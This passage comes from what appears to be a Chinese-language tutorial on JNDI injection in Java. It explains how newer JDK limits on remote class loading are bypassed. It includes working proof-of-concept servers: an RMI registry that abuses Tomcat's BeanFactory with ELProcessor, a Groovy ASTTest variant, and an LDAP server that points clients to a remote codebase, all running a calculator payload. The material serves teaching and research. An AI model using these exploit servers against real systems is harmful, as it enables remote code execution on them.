style="color:#000000;">方法二：令var8.getFactoryClassLocation()的返回结果null。即，让var8对象的classFactoryLocation属性为空，这个属性表示引用所指向对象的对应factory名称，对于远程代码加载而言是codebase，即远程代码的URL地址，这正是上文针对低版本的利用方法；如果对应的factory是本地代码，则该值为空，这是绕过高版本JDK限制的关键。</font></li><li><font style="color:#000000;">方法三：在命令行指定com.sun.jndi.rmi.object.trustURLCodebase参数为true即可。</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            var8 = (Reference)var3;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var8 != <span class="literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">上文提到了</font><strong><font style="color:#000000;">绕过高版本JDK限制的关键是利用本地的Reference Factory类</font></strong><font style="color:#000000;">。要满足方法二的理由前提，只需要在远程RMI服务器返回的Reference对象中不指定Factory的codebase。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730864293075-c7ef2851-dd1d-4e18-b1b9-4712f2fdde55.png"></p><p><font style="color:#000000;">接着看看javax.naming.spi.NamingManager#getObjectInstance方法，在处理Reference对象时，先调用</font><font style="color:#000000;background-color:#ffffff;">getFactoryClassName方法获取对应工厂类的名称，即先在本地的CLASSPATH中寻找该类，如果找到了的话直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果没找到则通过网络请求来获取。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730864561120-3c6eb37b-e7f1-4da7-93ad-30c977ce5716.png"></p><p><font style="color:#000000;">之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法，因此只需要在攻击者本地CLASSPATH找到这个Reference Factory类，并且在这四个地方其中一块能执行Payload即可。</font></p><p><font style="color:#000000;">在javax.naming.spi.NamingManager#getObjectFactoryFromReference的return语句中，对Factory类的实例对象进行了类型转换，因此利用的本地工厂类需要实现javax.naming.spi.ObjectFactory接口，并且该工厂类至少存在一个getObjectInstance方法。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730865087517-3ca4105f-bfbf-414f-8c2e-66b36d74e1da.png"></p><p><font style="color:#000000;">整个利用过程的主要调用栈如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#lookup()</span><br><span class="line">RegistryContext#lookup()</span><br><span class="line">RegistryContext#decodeObject()</span><br><span class="line">NamingManager#getObjectInstance()</span><br><span class="line">objectfactory = NamingManager#getObjectFactoryFromReference()</span><br><span class="line">Class#newInstance()或objectfactory#getObjectInstance()</span><br></pre></td></tr></table></figure><h5 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h5><p><font style="color:#000000;">存在于Tomcat依赖包中的org.apache.naming.factory.BeanFactory就是满足条件之一，org.apache.naming.factory.BeanFactory在getObjectInstance方法中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">    <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. 反射获取类对象</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 初始化类实例</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span></span><br><span class="line">    <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 循环解析别名并保存到字典中</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">上述代码中，可以通过在返回给客户端的Reference对象的forceString字段指定setter方法的别名，并在后续初始化过程中进行调用。</font></p><p><font style="color:#000000;">forceString的格式为a&#x3D;foo,bar，以逗号分隔每个需要设置的属性，如果包含等号，则对应的setter方法为等号后的值foo，如果不包含等号，则setter方法为默认值setBar。</font></p><p><font style="color:#000000;">在后续调用时，调用setter方法使用单个参数，且参数值为对应属性对象RefAddr的值。因此，实际上可以调用任意指定类的任意方法，并指定单个可控的参数。</font></p><p><font style="color:#000000;">因为使用newInstance创建实例，所以只能调用无参构造，这就要求目标class得有无参构造方法，上面forceString可以给属性强制指定一个setter方法，参数为一个String类型，因此利用javax.el.ELProcessor作为目标class，利用el表达式执行命令。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServerTomcatBypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;bypass&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h5><p><font style="color:#000000;">Groovy程序允许执行断言，也就意味着存在命令执行，借助BeanFactory的功能，使程序执行GroovyClassLoader#parseClass，然后去解析Groovy脚本即可。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServerGroovyBypass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;bypass&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本JDK-1"><a href="#低版本JDK-1" class="headerlink" title="低版本JDK"></a>低版本JDK</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server Code</span></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8888/#EXP&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730881325456-f498d634-fa32-4840-a4a2-c051ce0e50cb.png"></p><h4 id="高版本JDK-1"><a href="#高版本JDK-1" class="headerlink" title="高版本JDK"></a>高版本JDK</h4><p><font style="color:#000000;">从JDK 6u211、7u201、11.0.1、8u191及更高版本开始，com.sun.jndi.ldap.object.trustURLCodebase的默认值为false，对LDAP Reference远程加载Factory类进行了限制，因此也需要找到绕过的方式。</font></p><p><font style="color:#000000;">在LDAP中，Java有多种方式进行数据存储。</font></p><ul><li><font style="color:#000000;">序列化数据</font></li><li><font style="color:#000000;">JNDI Reference</font></li><li><font style="color:#000000;">Marshalled Object</font></li><li><font style="color:#000000;">Remote Location</font></li></ul><p><font style="color:#000000;">除此以外，LDAP也可以为存储的对象指定多种属性。</font></p><ul><li><font style="color:#000000;">javaCodeBase</font></li><li><font style="color:#000000;">objectClass</font></li><li><font style="color:#000000;">javaFactory</font></li><li><font style="color:#000000;">javaSerializedData</font></li></ul><p><strong><font style="color:#000000;">LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。</font></strong><font style="color:#000000;">如果LDAP存储的某个对象的javaSerializedData值不为空，则客户端会通过调用obj.decodeObject()方法对该属性值内容进行反序列化，当客户端存在反序列化相关组件漏洞，则可以通过LDAP来传输恶意序列化对象。</font></p><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#decodeObject方法，其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象，也可能是一个Reference对象。decodeObject方法存在对JAVA_ATTRIBUTES[SERIALIZED_DATA]的判断，其中JAVA_ATTRIBUTES[1]为javaSerializedData。</font></p><p><img 